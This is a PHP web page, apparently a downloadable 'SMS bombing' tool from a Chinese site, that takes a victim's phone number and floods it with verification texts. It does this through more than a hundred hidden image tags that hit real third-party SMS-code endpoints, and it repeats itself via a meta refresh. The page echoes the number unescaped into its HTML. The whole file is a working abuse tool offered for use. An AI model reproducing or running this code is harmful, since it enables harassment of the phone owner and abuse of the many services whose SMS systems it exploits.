<?php
require './php/common.php';
?>
<!DOCTYPE html>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo $conf['title']?></title>
<meta name="keywords" content="<?php echo $conf['keywords']?>">
<meta name="description" content="<?php echo $conf['description']?>">
<!--本源码作者 宇露网www.dyl5.com  妈妈说删版权会长不大ovo-->
<!-- Bootstrap -->
<link href="http://cdn.bootcss.com/bootstrap/3.2.0/css/bootstrap.css" rel="stylesheet">

<style>
	body{
		margin: 0 auto;
		text-align: center;
	}
	.container {
	  max-width: 580px;
	  padding: 15px;
	  margin: 0 auto;
	}
	

</style>
</head>

<body style="background-image: url(http://www.pptbz.com/pptpic/UploadFiles_6909/201406/2014061415430467.jpg);background-attachment: fixed;background-repeat: no-repeat;background-size: cover;-moz-background-size: cover;">
<div class="container">
	<div class="header">
        <ul class="nav nav-pills pull-right" role="tablist">
          <li role="presentation" class="active"><a href="index.php">短信轰炸</a></li>
          <li role="presentation"><a href="http://www.dyl5.com">下载程序</a></li>
        </ul>
        <h3 class="text-muted" align="left">宇露网</h3>
     </div>
	<hr>
	
	
<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
                <div class="panel-heading bk-bg-primary">
                    <h6><span class="panel-title">在线短信轰炸</span></h6>
                </div>
                <div class="panel-body">
				
				 <div class="input-group">
        <span class="input-group-addon">手机号</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止线程</button>
 
		</div>
		</form>
<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a;
$d=$_GET['hm'];
?>
    
<div class="tip">
<?php
$i=13;//
if($i==$d){
   echo "<br><br><H4>0</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>轰炸已经启动,  对<strong>$d</strong>,已经开始短信轰炸,请静静的等待1-5分钟查看效果，轰炸进行中请勿关闭页面</div></div>";
    echo "<div style='display:none'>
<img src='https://www.4008123123.com/phhs_ios/isNotExistUser.action?r=0.1279960350321454?phone=$d' alt=''/>
<img src='http://www.chengshiluntan.com/plugin.php?id=zhanmishu_sms:send&no_submit=no_submit&method=send?mobile=$d' alt=''/>
<img src='http://www.medmeeting.com/userInfo/userVerCode?source=web&phone=$d' alt=''/>
<img src='http://www.ksdao.com/sendMsgCode?mobile=$d' alt=''/>
<img src='http://www.jsvideo.tv/sendMsg?phone=$d' alt=''/>
<img src='http://ihaiyan.com/plugin.php?id=smstong:verifycode&idhash=SRhXvpS0&formhash=a8374fdf&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d' alt=''/>
<img src='http://www.kl.cc/User/RegSendMobilMail?t=Sun%20Jul%2030%202017%2011:42:11%20GMT+0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)?mob=$d' alt=''/>
<img src='http://www.wandafilm.com/login.do?m=sendSms?mobile=$d' alt=''/>
<img src='https://www.xinrong.com/v2/register/register_tel_captcha_check_ip_and_phone.jso?tellPhone=$d' alt=''/>
<img src='http://www.chatm.com/userInfo/smsCode?mobilephone=$d' alt=''/>
<img src='http://www.chatm.com/userInfo/smsCode?mobilephone=$d' alt=''/>
<img src='http://www.rc169.cn/resume/Register_check.aspx?value=$d' alt=''/>
<img src='http://api.funwear.com/mbfun_server/index.php?m=User&a=getcode?account=$d' alt=''/>
<img src='http://www.chinaropeway.org/api/auth/getsmsvalid?datasource=check_regist&app=personal&mod=member&id=$d' alt=''/>

<img src='http://sso1.nlc.cn/sso/currency/sendCodeToMobile?mobile=$d' alt=''/>
<img src='http://www.yl1001.com/personServe/regdeal_2013.php?detail=sendcodeabcd&cks=8a0f106261ec6abad945b1d2041f3346?mobile=$d' alt=''/>
<img src='http://hy.hryouxi.com/HRPF/website/sendSMS.do?phone=$d' alt=''/>
<img src='https://www.4008123123.com/phhs_ios/isNotExistUser.action?r=0.9460999953115119?phone=$d' alt=''/>
<img src='http://www.hongzhoukan.com/ajax/check_tel_reg.php?mobile=$d' alt=''/>
<img src='http://www.no1wp.com/ajax/MobileSendYZM.ashx?nocache=0.3343191107123564&mobile=$d' alt=''/>
<img src='http://www.baiwang.com/cterminal/api/service/getsmsvalidatecode?telephone=$d' alt=''/>
<img src='http://www.upshop.cn/Home/User/registerSendCode.html?mobile=$d' alt=''/>
<img src='http://www.jsvideo.tv/sendMsg?phone=$d' alt=''/>
<img src='http://api.funwear.com/mbfun_server/index.php?m=User&a=getcode?account=$d' alt=''/>
<img src='http://my.21food.cn/register_ajax!sendRegCode2.action?url_randparams=Kr3MLe6134_2c0295ca-452b-44b6-b263-feda6b1ecca8&mobile=$d' alt=''/>
<img src='http://www.xjggjy.com/platform/service/users/register/sendMessage?mobile=$d' alt=''/>
<img src='http://www.mgff.com/passport/send_mobile_yzm?mobile=$d' alt=''/>
<img src='http://member.med66.com/uc/smscode?phone=$d' alt=''/>
<img src='http://www.hzrc.com/ww/b/a/wwba_sendMobileCode.html?phone=$d' alt=''/>
<img src='https://login.zbj.com/register/sendRegisterCode?sacc=$d' alt=''/>
<img src='http://www.zoneidc.com/user/sendmobi.asp?mobi=$d' alt=''/>
<img src='http://passport.ctrl.cn/sms/reg?mobile=$d' alt=''/>
<img src='http://www.ucpaas.com/checkcode/getSessionCountdown?phone=$d' alt=''/>
<img src='https://cardloan.xiaoying.com/h5/user/check_register?mobile=$d' alt=''/>
<img src='http://wifi.gd118114.cn/getPassword.ajax?username=$d' alt=''/>
<img src='http://bj1.xiangcloud.com.cn/customer/sms/?phone=$d' alt=''/>
<img src='http://www.pzhfc.gov.cn/regist/sendcode?mobile=$d' alt=''/>
<img src='https://www.4008123123.com/phhs_ios/isNotExistUser.action?r=0.4572958659946349?phone=$d' alt=''/>
<img src='http://forum.xitek.com/forum.php?mod=ajax&infloat=register&handlekey=register&action=vcode&inajax=1&fp=4155208328&check=80e5&mobile=$d' alt=''/>
<img src='https://login.10086.cn/chkNumberAction.action?userName=$d' alt=''/>
<img src='http://www.023jz.com/register/sendMobileCode.html?mobile=$d' alt=''/>
<img src='http://center.siyi.cn/process.aspx?c=sendvcode&vt=sms&va=reg&mobile=$d' alt=''/>
<img src='http://wap.yunxin123.com/index/getregcode/bid/yunxin?mobile=$d' alt=''/>
<img src='http://i.kuwo.cn/US/2014/api/send_sms.jsp?mobile=$d' alt=''/>
<img src='http://passport.csdn.net/account/mobileregister?action=sendMobileCode&mobile=$d' alt=''/>
<img src='http://www.enjoykeys.com/h5_api/get_verification_code.json|mobile=$d' alt=''/>
<img src='http://mobile.bisinuolan.cn/Home/SendCode|Mobile=$d' alt=''/>
<img src='http://wx.95504.net/MicroSide/JFSCPhoneValidate.ashx|methodflag=setCode&phone=$d' alt=''/>
<img src='http://www.4008123123.com/phhs_ios/sendSmsCodeVip.action|phone=$d' alt=''/>
<img src='http://wifi.gd118114.cn/getPassword.ajax|username=$d&accessType=1&circleId=100000055' alt=''/>
<img src='http://n.youyuan.com/v20/info/send_captcha.html|mobile=$d' alt=''/>
<img src='http://120.25.70.201:6081/GetSmsCheckCode|RequestArgs=$d' alt=''/>
<img src='http://www.czsuchang.com/Member/common/sendphone/|cellphone=$d' alt=''/>
<img src='http://a.whale.ikanlive.com/web/web_send_veri_code|phone=$d' alt=''/>
<img src='http://www.liboshijie.com/public/index.php/Login/phones|mobile=$d' alt=''/>
<img src='http://www.lscp6.com/ajax/reglog.php|txtaction=reg&txttjid=NaN&txttel=$d&txtpsw=a12456&txttype=1&txtcode=' alt=''/>
<img src='http://m.lbwan.com/verify|phone=$d' alt=''/>
<img src='http://www.guoyingjinfu.com/Sso/sendRegisterSmsNew|username=$d&type=pic' alt=''/>
<img src='http://fadmin.lissc.cn/send_sms|username=$d' alt=''/>
<img src='http://www.wantao168.com/u/?mod=reg|action=getcode&tel=$d' alt=''/>
<img src='http://www.pgtcyy.com/register/sendcode|val=$d&imgcode=' alt=''/>
<img src='http://h5.gametanzi.com/media.php?s=/Subscriber/telsvcode.html|phone=$d' alt=''/>
<img src='http://service.6cai310.com/Api/Msg/SendMsg|ticket=0&actionName=sendmsg&content=$d' alt=''/>
<img src='http://r.runlongguoji.com/index.php/Login/sms_valid_code|m=$d' alt=''/>
<img src='http://www.bhwh.gov.cn/api/Util/sendAuthCode.html|mobile=$d' alt=''/>
<img src='http://b2c.csair.com/portal/smsMessage/EUserVerifyCode|mobile=$d' alt=''/>
<img src='http://www.upshop.cn/Home/User/registerSendCode.html|mobile=$d' alt=''/>
<img src='https://passport.xinpianchang.com/api/v1/mobile/send|is_register=1&phone=$d&prefix_code=%2B86' alt=''/>
<img src='http://mskypearl.csair.com/mskypearl/sendRegAuthentiCode.do|contactNum=$d&contactType=PHONE&countryCode=86' alt=''/>
<img src='https://login.10086.cn/chkNumberAction.action|userName=$d' alt=''/>
<img src='https://reg.suning.com/srs-web/ajax/code/sms.do|scen=PERSON_MOBILE_REG_VERIFY_MOBILE&phoneNum=$d&uid=&code=' alt=''/>
<img src='http://123.56.102.205:8280/api/v1/member/send_valid_code|mobile=$d&type=register&platform=pc&time=1500264000165&sign=b8d7180120685fe93608272e095604cf' alt=''/>
<img src='http://www.zhonfan.com/ytbase/system/default.aspx|orgcode=244&tel=$d&YtAction=YtBootstrapPage.OpterAction&YtOpt=getyzm&DB_Conn=DbDefault&YtParamsCount=0' alt=''/>
<img src='http://www.okct.net/client_codeCode.tmp|clientForm.mobile=$d&clientForm.code=&clientForm.password=&clientForm.confirmpassword=&clientForm.allow_argeemet=1&clientForm.act_type=1' alt=''/>
<img src='http://tg.cf300888.com.cn/CoinProject/SendCaptchaController/send/register|mobile=$d&openId=or2A41lTkzVbjJkTbLeND3JOcccg&redPacketId=&isRed=0' alt=''/>
<img src='https://passport.ceair.com/cesso/mobile!geetCheck.shtml?_0.020283224898892227|mobileNo=$d&geetest_challenge=&geetest_validate=&geetest_seccode=' alt=''/>
<img src='http://jubaopen8.com/cornu/sendSms?phone=$d' alt=''/>
<img src='http://www.ishansong.com/web/order/getCaptcha/$d/OGVLTm1rV0lvd0hpSHEwc0s4R3kyY1c4MTUwMTY2NTEwNTUxMjY=' alt=''/>
<img src='http://www.ishansong.com/user/register/captcha/$d/5yax/OGVLTm1rV0lvd0hpSHEwc0s4R3kyY1c4MTUwMTY2NTEwNTUxMjY=' alt=''/>
<img src='http://www.ishansong.com/web/get/voice/code?mobile=$d' alt=''/>
<img src='https://uac.10010.com/portal/Service/CheckNeedVerify?callback=jsonp1501665698499&userName=$d&pwdType=02' alt=''/>
<img src='https://uac.10010.com/oauth2/OpSms?callback=jsonp1501665698500&req_time=1501665713979&user_id=$d&app_code=ECS-YH-WAP' alt=''/>
<img src='http://xq.ibaihe.com/register/captcha?phone=$d&checkRegisted=1&captaha_img=ugaa&_=1501665801145' alt=''/>
<img src='http://www.zhichiwangluo.com/index.php?r=Login/phoneResetCode&phone=$d&allow=1&pic_code=i8si' alt=''/>
<img src='http://www.patfun.com/do.php?ac=check_sms&phone=$d' alt=''/>
<img src='http://www.ixinzang.com/register/checkImgCaptchas?ImgCaptchas=amku&Mobile=$d' alt=''/>
<img src='http://www.ixinzang.com/register/senderRegisterCaptcha?mobilePhone=$d&ImgCaptchas=amku' alt=''/>
<img src='http://ruzhu.jd.com/user/sendVC?phone=$d&graphCode=d365&uid=59819bd57e935230656bad73' alt=''/>
<img src='http://ruzhu.jd.com/user/sendVC?phone=$d&graphCode=d365&uid=59819bd57e935230656bad73' alt=''/>
<img src='http://www.wildto.com/m/api/user?username=$d&type=5&_=1501666525178' alt=''/>
<img src='http://www.wildto.com/m/api/user?username=$d&type=7&auth=denv&_=1501666525496' alt=''/>
<img src='https://www.zuhaowan.com/Login/sendRegSmsCode.html?verify_code=6132&mobile=$d' alt=''/>
<img src='http://center.ixingtu.com/ixtReport4/phoneCode/getIXTCode?phone=$d' alt=''/>
<img src='http://www.peizimenhu.com/misc.php?mod=seccode&action=check&inajax=1&modid=plugin::tshuz_smslogin&idhash=wqSAhMKdYF&secverify=%E8%82%B2%E8%8C%83' alt=''/>
<img src='http://www.niaogebiji.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkmobile&mobile=$d&0.9895470487106054' alt=''/>
<img src='http://www.guojianquan.com/plugin.php?id=smstong:verifycode&idhash=SAHMf690&formhash=6afe1b70&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkmobile&mobile=$d&0.2830665939153326' alt=''/>
<img src='http://www.gsdata.cn/member/checkmobile5?mobile=$d' alt=''/>
<img src='http://www.gsdata.cn/member/sendmobile?mobile=$d&oauth=a78a7bf2063f3deb4fca7f5abeb1071e&time=95271501670751&temp=register' alt=''/>
<img src='http://www.medmeeting.com/userInfo/newVerCode?source=web&imgCode=zvty&phone=$d' alt=''/>
<img src='http://www.fatianshi.cn/Account/GetSmsCode?phoneNumber=$d&_=1501673413347' alt=''/>
<img src='http://www.bdwork.com/appapi.php?mod=phone_getMobileCode&code=194b&mobile=$d' alt=''/>
<img src='http://www.niaogebiji.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkmobile&mobile=$d' alt=''/>
<img src='http://passport.ziroom.com/verify/code/v2?callback=jQuery18306522735118886429_1501592265458&phone=$d&type=1&imgId=d5a50da1507050b1ff50a0538af096dc&imgVValue=znzh&_=1501592318576' alt=''/>
<img src='http://www.qz91.gov.cn/ajax/ajaxget.ashx?action=GetVCode&mobile=$d' alt=''/>
<img src='http://www.fatianshi.cn/Account/GetSmsCode?phoneNumber=$d&_=1501427630632' alt=''/>
<img src='http://www.niaogebiji.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregisterverifycode&requestfrom=register&mobile=$d&0.8251383549402975' alt=''/>
<img src='http://passport.u9game.net/getvcode?phone=$d&for=reg' alt=''/>
<img src='http://jc.chatm.com/login/sendPhoneCaptcha?phone=$d&checkWay=0' alt=''/>
<img src='http://www.niaogebiji.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregisterverifycode&requestfrom=register&mobile=$d&0.6065346321485041' alt=''/>
<img src='http://www.amazoner.cn/plugin.php?id=smstong:verifycode&idhash=STIU6B00&formhash=64f578c5&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.2339327853935892' alt=''/>
<img src='http://0517w.com/plugin.php?id=smstong:verifycode&idhash=S0&formhash=20f70e9b&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.009355726803150777' alt=''/>
<img src='http://www.deluxworld.com/bbs/plugin.php?id=smstong:verifycode&idhash=SqF8h7v0&formhash=ad58e184&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkmobile&mobile=$d&0.2623440619771774' alt=''/>
<img src='http://www.deluxworld.com/bbs/plugin.php?id=smstong:verifycode&idhash=SqF8h7v0&formhash=ad58e184&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.7397882618655364' alt=''/>
<img src='http://0517w.com/plugin.php?id=smstong:verifycode&idhash=S0&formhash=20f70e9b&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.5420664800524692' alt=''/>
<img src='http://bbs.yiai.me/plugin.php?id=smstong:verifycode&idhash=SRQ13Xn0&formhash=6c39abf9&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkmobile&mobile=$d&0.5827007480459947' alt=''/>
<img src='http://bbs.yiai.me/plugin.php?id=smstong:verifycode&idhash=SRQ13Xn0&formhash=6c39abf9&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.45299802084770724' alt=''/>
<img src='http://www.stage1st.com/2b/plugin.php?id=smstong:verifycode&idhash=SlGakCN0&formhash=cded2681&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.6963836390094115' alt=''/>
<img src='http://www.guojianquan.com/plugin.php?id=smstong:verifycode&idhash=SiXXglK0&formhash=6afe1b70&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkmobile&mobile=$d&0.7012072842629671' alt=''/>
<img src='http://www.guojianquan.com/plugin.php?id=smstong:verifycode&idhash=SiXXglK0&formhash=6afe1b70&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.6462015323807754' alt=''/>
<img src='http://www.asklicai.com/bbs/plugin.php?id=smstong:verifycode&idhash=SiGx2ec0&formhash=4a2f51c1&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$d&0.7409481565475012' alt=''/>
<img src='http://www.gsdata.cn/member/sendmobile?mobile=$d&oauth=86d721ac61ac63a39b95e19d70ac3999&time=70061501430822&temp=register' alt=''/>
<img src='http://www.chinaropeway.org/api/auth/getsmsvalid?datasource=check_regist&app=personal&mod=member&id=$d' alt=''/>
<img src='http://www.medmeeting.com/userInfo/userVerCode?source=web&phone=$d' alt=''/>
<img src='http://www.niaogebiji.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregisterverifycode&requestfrom=register&mobile=$d&0.6581421314683657' alt=''/>
<img src='http://passport.u9game.net/getvcode?phone=$d&for=reg' alt=''/>
<img src='http://passport.u9game.net/getvcode?phone=$d&for=reg' alt=''/>
<img src='http://passport.u9game.net/getvcode?phone=$d&for=reg' alt=''/>
<img src='http://jc.chatm.com/login/sendPhoneCaptcha?phone=$d&checkWay=0' alt=''/>
<img src='http://cowarobot.com/Member/Data/SendCode.aspx?tosj=$d&toyx=&type=1' alt=''/>
<img src='http://yun.cccvip.top/index.php?hn=$d&ok=' alt=''/>
<img src='http://www.chinaropeway.org/api/auth/getsmsvalid?datasource=check_regist&app=personal&mod=member&id=$d' alt=''/>
<img src='http://lxbjs.baidu.com/newFloat/xCode?vtel=$d&siteid=9984520&bdcbid=c41e2a70-f5cd-41e4-89c6-3f783c7f1ff1&refer_domain=&t=1500618244152&callback=_lxb_jsonp_j5dhcvnc_' alt=''/>
<img src='http://www.qz91.gov.cn/ajax/ajaxget.ashx?action=GetVCode&mobile=$d' alt=''/>
<img src='http://lxbjs.baidu.com/newFloat/_c.js?vtel=$d&siteid=9984520&bdcbid=c41e2a70-f5cd-41e4-89c6-3f783c7f1ff1&refer_domain=&code=5A19DA4260F8275BDB050B19467CDD3B32A10AACBB5ECC7B792DC7EF00FE88C6EB4A34C5D4A1B4764A954C6E84833DB6AED04243D8725124D3DE9220A80F464D18523E8AB9C752094CEFD04A0B19BEB99DBA68F25B38ECE5989EBE5B1065F16D&t=1500618244230&callback=_lxb_jsonp_j5dhcvpi_' alt=''/>
<img src='http://www.xbrc.com.cn/xbrc/front/common/send?t=1&sn=$d' alt=''/>
<img src='http://fatianshi.cn/Account/GetSmsCode?phoneNumber=$d&_=1500556088712' alt=''/>
<img src='http://aeventlog.beacon.qq.com:8080/analytics/upload?mType=beacon?rid=7bc4f649d5ce8495&sid=307cbfafd32b47d0572adea2bd99b5ab' alt=''/>
<img src='http://www.fatianshi.cn/Account/GetSmsCode?phoneNumber=$d&_=1500556088712' alt=''/>
<img src='http://www.niaogebiji.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregisterverifycode&requestfrom=register&mobile=$d&0.6581421314683657' alt=''/>
<img src='http://www.medmeeting.com/userInfo/userVerCode?source=web&phone=$d' alt=''/>
<img src='http://www.bdwork.com//appapi.php?mod=phone_getMobileCode&mobile=$d' alt=''/>
<img src='http://www.hytvu.com.cn/index.php/Study/Sms/sendindexyzm.html?phone=$d' alt=''/>
<img src='http://www.changfanz.com/store/user.php?act=get_verify&mobile_phone=$d&1500968436326326' alt=''/>
<img src='http://www.easyke.com/users/message_code?phone=86$d&demo=undefined&_=1500976424741' alt=''/>
<img src='http://passport.u9game.net/getvcode?phone=$d&for=reg' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=$d&appId=u4399&v=1&sig=150106098724920c70e0&v=1' alt=''/>
</div>";
     echo"<meta http-equiv=refresh content='9999999999; url=index.php?hm=$d&amp;c=$a'>";
}

?> <br>
						
<?php echo $conf['gonggao']?>
				<hr><div class="container-fluid">
  <a href="http://shang.qq.com/wpa/qunwpa?idkey=19609478a8ba6ff85b2a86e1d1781859d4ba28e75ad03f3eda9437ae0b519171" class="btn btn-default btn-sm"><span class="glyphicon glyphicon-credit-card"></span> 加群</a>
  <a href="http://www.dyl5.com" class="btn btn-default btn-sm"><span class="glyphicon glyphicon-exclamation-sign"></span> 帮助</a> 
  <button type="button" class="btn btn-info btn-sm" data-toggle="collapse" data-target="#lxkf-1"><span class="glyphicon glyphicon-user"></span> 客服</button> 
  <a href="http://wpa.qq.com/msgrd?v=3&uin=<?php echo $conf['zzqq']?>&site=qq&menu=yes" class="btn btn-default btn-sm"><span class="glyphicon glyphicon-pencil"></span> 反馈</a>
</div>
<p style="text-align:center"><br>&copy; Powered by <a href="http://www.dyl5.com">宇露网</a>!</p></div>
</body>
</html>